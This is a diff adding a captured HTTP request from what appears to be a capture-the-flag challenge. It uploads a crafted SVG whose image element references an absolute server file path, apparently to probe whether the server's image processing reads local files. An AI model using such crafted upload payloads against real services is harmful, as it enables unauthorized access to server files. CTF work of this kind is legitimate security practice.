@@ -1,0 +1,23 @@
+POST /?action=upload HTTP/1.1
+Host: gphotos.ctfcompetition.com:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://gphotos.ctfcompetition.com:1337/?
+Content-Type: multipart/form-data; boundary=---------------------------131390256914074084551261368828
+Content-Length: 413
+Connection: close
+Cookie: PHPSESSID=v08fe3noljdgo3osmiub90el13
+Upgrade-Insecure-Requests: 1
+
+-----------------------------131390256914074084551261368828
+
+Content-Disposition: form-data; name="photo"; filename="test8.svg"
+Content-Type: image/svg+xml
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="120px" height="120px">
+<image href="/var/www/html/upload/dd22ec3ed24a93b7f8d769aa30ceef35/872d2201b8e3c0e7170ba5e9be1ea982.png" />
+</svg>
+
+-----------------------------131390256914074084551261368828--
